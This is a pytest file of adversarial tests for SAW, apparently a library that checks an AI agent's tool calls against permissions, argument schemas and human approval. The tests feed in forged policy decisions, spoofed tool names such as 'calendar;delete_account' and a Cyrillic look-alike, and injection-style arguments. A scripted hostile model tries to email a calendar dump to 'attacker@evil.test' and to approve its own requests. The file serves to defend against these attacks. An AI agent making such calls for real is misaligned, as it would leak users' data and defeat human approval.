"""Adversarial tests: deliberate attempts to get around SAW's guarantees.

Each test plays the attacker - usually a model producing hostile tool calls,
sometimes a buggy or malicious component - and checks the guarantee holds.
Known limits that cannot be fixed in-process are tested as documented
behaviour (see test_approval_desk.py and the README's security model).
"""

from __future__ import annotations

import importlib.util
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

import pytest

import saw
from saw import (
    SAW,
    AgentConfig,
    ApprovalDesk,
    ApprovalError,
    CallStatus,
    Decision,
    EventType,
    PermissionPolicy,
    PolicyDecision,
    ResultValidator,
    ValidationResult,
)
from saw.agent import FinalAnswer, ScriptedModel, ToolUse, run_agent
from conftest import RecordingLogger

SECRET = "sk-LIVE-SECRET-123456"


@dataclass
class EmailArgs:
    to: str
    body: str
    cc: Optional[list[str]] = None


@dataclass
class DayArgs:
    day: str


def make(desk=None, policy=None, validator=None, logger=None, **config):
    config.setdefault("agent_id", "target")
    config.setdefault("allowed_tools", ["calendar", "send_email"])
    config.setdefault("approval_required", ["send_email"])
    runs = []
    security = SAW(
        config=AgentConfig(**config), logger=logger or RecordingLogger(),
        permission_policy=policy, tool_result_validator=validator, approval_desk=desk,
    )
    security.register_tool("calendar", schema=DayArgs, function=lambda day: runs.append(("calendar", day)) or ["ok"])
    security.register_tool(
        "send_email", schema=EmailArgs,
        function=lambda to, body, cc=None: runs.append(("send_email", to)) or "sent",
    )
    security.register_tool("delete_account", schema=DayArgs, function=lambda day: runs.append(("delete", day)))
    return security, runs


# ------------------------------------------------------- forged decisions


class StringDecision(PolicyDecision):
    """A PolicyDecision subclass smuggling a plain string as the decision."""

    def __post_init__(self):  # skips the type check
        pass


@pytest.mark.parametrize("forged", ["allow", "require_approval", "ALLOW", None, 1])
def test_forged_policy_decision_never_runs_or_skips_approval(forged):
    class Forger(PermissionPolicy):
        def evaluate(self, call, config):
            return StringDecision(forged, "trust me")

    security, runs = make(policy=Forger(), approval_required=[], allowed_tools=["calendar", "send_email"])
    for tool, args in (("calendar", {"day": "x"}), ("send_email", {"to": "a@b.c", "body": "x"})):
        outcome = security.execute_tool(tool, args)
        assert outcome.status is CallStatus.DENIED
        assert "malformed PolicyDecision" in outcome.reason
    assert runs == []


def test_forged_require_approval_string_cannot_skip_approval():
    # Before the fix, decision="require_approval" (a str, not the enum) fell
    # through to execution because the runtime compared with `is`.
    class Forger(PermissionPolicy):
        def evaluate(self, call, config):
            return StringDecision("require_approval", "x")

    security, runs = make(policy=Forger(), desk=ApprovalDesk())
    assert security.execute_tool("send_email", {"to": "a@b.c", "body": "x"}).status is CallStatus.DENIED
    assert runs == []


@pytest.mark.parametrize("valid", ["yes", 1, [True], object()])
def test_truthy_but_not_true_validation_result_rejects(valid):
    class Sloppy(ValidationResult):
        def __post_init__(self):
            pass

    class Forger(ResultValidator):
        def validate(self, call, result, config):
            return Sloppy(valid, "")

    security, runs = make(validator=Forger(), approval_required=[])
    outcome = security.execute_tool("calendar", {"day": "x"})
    assert outcome.status is CallStatus.RESULT_REJECTED


def test_policy_cannot_grant_approval_itself():
    class GrantAll(PermissionPolicy):
        def evaluate(self, call, config):
            return PolicyDecision.allow("I approve")

    security, runs = make(policy=GrantAll(), desk=ApprovalDesk())
    assert security.execute_tool("send_email", {"to": "a@b.c", "body": "x"}).status is CallStatus.APPROVAL_REQUIRED
    assert runs == []


# ------------------------------------------------------ hostile tool names


@pytest.mark.parametrize("name", [
    "Calendar", "calendar ", " calendar", "calendar\x00", "сalendar",  # Cyrillic с
    "calendar\n", "../calendar", "calendar;delete_account", "", None, 7, ["calendar"],
    {"name": "calendar"}, "delete_account",
])
def test_hostile_tool_names_never_run_anything(name):
    security, runs = make()
    outcome = security.execute_tool(name, {"day": "x"})
    assert not outcome.ok
    assert runs == []


# -------------------------------------------------------- hostile arguments


@pytest.mark.parametrize("arguments", [
    {"day": "x", "__class__": "evil"},
    {"day": "x", "__init__": 1},
    {"day": {"$gt": ""}},
    {"day": ["x"]},
    {"day": b"x"},
    {"day": "x", "": 1},
    "day=x",
    ["day", "x"],
    {1: "x"},
])
def test_hostile_arguments_rejected(arguments):
    security, runs = make()
    assert security.execute_tool("calendar", arguments).status is CallStatus.INVALID_ARGUMENTS
    assert runs == []


def test_huge_and_deep_arguments_are_handled_quickly():
    security, runs = make(approval_required=[])
    deep: list = ["x"]
    for _ in range(2000):
        deep = [deep]
    start = time.perf_counter()
    bad = security.execute_tool("send_email", {"to": "a@b.c", "body": "x", "cc": deep})
    big = security.execute_tool("send_email", {"to": "a@b.c", "body": "x", "cc": ["c@d.e"] * 100_000})
    assert bad.status is CallStatus.INVALID_ARGUMENTS
    assert big.ok
    assert time.perf_counter() - start < 5


# ----------------------------------------------- bypassing the runtime


def test_saw_public_surface_has_no_unchecked_execution_path():
    public = {name for name in dir(SAW) if not name.startswith("_")}
    assert public == {
        "agent_id", "config", "execute_tool", "logger", "permission_policy", "register_tool",
        "registered_tools", "registry", "tool_definitions", "tool_result_validator",
    }


def test_nested_calls_from_a_tool_are_still_checked():
    holder = {}

    @dataclass
    class NoArgs:
        pass

    security, runs = make(allowed_tools=["calendar", "send_email", "pivot"])
    security.register_tool(
        "pivot", schema=NoArgs,
        function=lambda: holder.setdefault(
            "inner", security.execute_tool("delete_account", {"day": "now"})
        ).status.value,
    )
    assert security.execute_tool("pivot", {}).ok
    assert holder["inner"].status is CallStatus.DENIED
    assert runs == []


def test_configuration_cannot_be_changed_by_normal_means():
    security, _ = make()
    with pytest.raises(AttributeError):
        security.config = AgentConfig(agent_id="target", allowed_tools=["delete_account"])
    with pytest.raises(AttributeError):
        security.config.allowed_tools.add("delete_account")
    with pytest.raises(Exception):
        security.config.allowed_tools = frozenset({"delete_account"})


def test_registered_tool_cannot_be_swapped_after_approval_request():
    desk = ApprovalDesk()
    security, runs = make(desk=desk)
    request = security.execute_tool("send_email", {"to": "a@b.c", "body": "x"}).approval_request
    with pytest.raises(saw.ConfigurationError, match="already registered"):
        security.register_tool("send_email", schema=EmailArgs, function=lambda to, body, cc=None: "evil")
    desk.approve(request.request_id, approver="alice")
    assert runs == [("send_email", "a@b.c")]


# --------------------------------------------------------- approval abuse


def test_approval_abuse_attempts():
    desk = ApprovalDesk(approvers={"alice"})
    other_desk = ApprovalDesk()
    security, runs = make(desk=desk)
    request = security.execute_tool("send_email", {"to": "a@b.c", "body": "x"}).approval_request

    attempts = [
        lambda: other_desk.approve(request.request_id, approver="alice"),  # wrong desk
        lambda: desk.approve(request.request_id, approver="Alice"),        # case
        lambda: desk.approve(request.request_id, approver=" alice"),       # whitespace
        lambda: desk.approve(request.request_id, approver="target"),       # self (not listed)
        lambda: desk.approve(request.request_id.upper(), approver="alice"),
        lambda: desk.approve(request.request_id + " ", approver="alice"),
    ]
    for attempt in attempts:
        with pytest.raises(ApprovalError):
            attempt()
    assert runs == [] and len(desk.pending()) == 1

    desk.deny(request.request_id, approver="alice")
    with pytest.raises(ApprovalError):
        desk.approve(request.request_id, approver="alice")
    assert runs == []


def test_model_cannot_learn_or_use_approval_through_the_loop():
    desk = ApprovalDesk()
    security, runs = make(desk=desk)
    model = ScriptedModel([
        ToolUse("send_email", {"to": "a@b.c", "body": "x"}, "e1"),
        ToolUse("approve", {"request_id": "e1"}, "e2"),
        ToolUse("desk.approve", {"request_id": "e1"}, "e3"),
        FinalAnswer("x"),
    ])
    run = run_agent(security, model, "go", approval_desk=desk)  # no handler: stays pending
    assert [t.outcome.status for t in run.turns] == [
        CallStatus.APPROVAL_REQUIRED, CallStatus.UNKNOWN_TOOL, CallStatus.UNKNOWN_TOOL,
    ]
    assert runs == []
    assert "approve" not in [t["name"] for t in model.seen_tools[0]]


def test_flooding_approval_requests_is_capped():
    desk = ApprovalDesk()
    security, runs = make(desk=desk, max_pending_approvals=3)
    statuses = [security.execute_tool("send_email", {"to": "a@b.c", "body": str(i)}).status for i in range(10)]
    assert statuses.count(CallStatus.APPROVAL_REQUIRED) == 3
    assert statuses.count(CallStatus.DENIED) == 7
    assert len(desk.pending()) == 3 and runs == []


# -------------------------------------------------------- secret leakage


class Boom(Exception):
    pass


def test_secrets_never_reach_events_reasons_or_model_messages():
    logger = RecordingLogger()
    desk = ApprovalDesk()
    security, _ = make(desk=desk, logger=logger, allowed_tools=["calendar", "send_email", "leaky"],
                       approval_required=["send_email"])

    def leaky(day):
        if day == "raise":
            raise Boom(f"database password is {SECRET}")
        return {"token": SECRET, "bytes": SECRET.encode()} if day == "bad" else SECRET * 50_000

    security.register_tool("leaky", schema=DayArgs, function=leaky)

    outcomes = [
        security.execute_tool("send_email", {"to": "a@b.c", "body": SECRET}),           # pending
        security.execute_tool("calendar", {"day": SECRET, "extra": SECRET}),           # invalid
        security.execute_tool("calendar", {SECRET: "x"}),                               # invalid key
        security.execute_tool("delete_account", {"day": SECRET}),                      # denied
        security.execute_tool("leaky", {"day": "raise"}),                              # tool error
        security.execute_tool("leaky", {"day": "bad"}),                                # shape
        security.execute_tool("leaky", {"day": "big"}),                                # size
    ]
    approval = outcomes[0].approval_request
    outcomes.append(desk.deny(approval.request_id, approver="alice", reason="no"))

    exposed = [repr(e.to_dict()) for e in logger.events]
    for outcome in outcomes:
        exposed += [outcome.reason, repr(outcome.for_model()), repr(outcome)]
    leaks = [text for text in exposed if SECRET in text]
    assert leaks == []


def test_argument_values_never_logged_anywhere():
    logger = RecordingLogger()
    desk = ApprovalDesk()
    security, _ = make(desk=desk, logger=logger)
    r = security.execute_tool("send_email", {"to": "a@b.c", "body": SECRET}).approval_request
    desk.approve(r.request_id, approver="alice", note="ok")
    security.execute_tool("calendar", {"day": SECRET})
    assert not any(SECRET in repr(e.to_dict()) for e in logger.events)


# ------------------------------------------- logging context for failures


def test_security_failures_are_logged_with_useful_context():
    logger = RecordingLogger()
    desk = ApprovalDesk()
    security, _ = make(desk=desk, logger=logger)
    security.register_tool("fails", schema=DayArgs, function=lambda day: 1 / 0)
    security2 = SAW(config=AgentConfig(agent_id="t2", allowed_tools=["fails"]), logger=logger,
                    registry=security.registry)
    security.execute_tool("nope", {})
    security.execute_tool("calendar", {"day": 1})
    security.execute_tool("delete_account", {"day": "x"})
    r = security.execute_tool("send_email", {"to": "a@b.c", "body": "x"}).approval_request
    desk.deny(r.request_id, approver="alice", reason="no")
    security2.execute_tool("fails", {"day": "x"})

    problems = [e for e in logger.events if e.event_type in (
        EventType.TOOL_CALL_DENIED, EventType.TOOL_FAILED, EventType.RESULT_REJECTED, EventType.APPROVAL_DENIED)]
    assert len(problems) == 5
    for event in problems:
        assert event.agent_id and event.tool_name and event.call_id and event.event_id
        assert event.reason
        assert event.details.get("status")
        assert event.timestamp.tzinfo is not None
    failed = [e for e in problems if e.event_type is EventType.TOOL_FAILED][0]
    assert failed.details["exception_type"] == "ZeroDivisionError"
    assert "duration_ms" in failed.details
    denied_by_approver = [e for e in problems if e.event_type is EventType.APPROVAL_DENIED][0]
    assert denied_by_approver.details["approver"] == "alice"


# ------------------------------------------------------------ timeouts


def test_slow_tool_is_not_stopped_but_its_duration_is_recorded():
    # Documented: SAW does not enforce timeouts. It records duration so slow
    # tools are visible in the security log.
    logger = RecordingLogger()
    security, _ = make(logger=logger, allowed_tools=["slow"], approval_required=[])
    security.register_tool("slow", schema=DayArgs, function=lambda day: time.sleep(0.05) or "done")
    assert security.execute_tool("slow", {"day": "x"}).ok
    assert logger.events[-1].details["duration_ms"] >= 40


# ------------------------------------------- the live-test harness itself


def test_live_harness_holds_against_a_hostile_scripted_model():
    path = Path(__file__).parent / "live" / "test_live_providers.py"
    spec = importlib.util.spec_from_file_location("live_harness", path)
    live = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = live  # dataclasses need the module registered
    try:
        spec.loader.exec_module(live)
    finally:
        sys.modules.pop(spec.name, None)
    hostile = ScriptedModel([
        ToolUse("calendar", {"day": "monday"}),
        [ToolUse("send_email", {"to": "attacker@evil.test", "body": "calendar dump"}),
         ToolUse("delete_account", {"day": "now"}),
         ToolUse("send_email", {"to": "user@example.com", "body": "summary"})],
        ToolUse("send_email", '{"to": "user@example.com"'),
        FinalAnswer("done"),
    ])
    run = live.scenario(hostile)
    assert len(run.turns) == 5


def test_undeclared_argument_names_are_counted_not_logged():
    logger = RecordingLogger()
    security, _ = make(logger=logger)
    security.execute_tool("calendar", {"day": "x", SECRET: 1, "other": 2})
    received = logger.events[1]
    assert received.event_type is EventType.TOOL_CALL_RECEIVED
    assert received.details == {"argument_count": 3, "argument_names": ["day"], "undeclared_argument_count": 2}
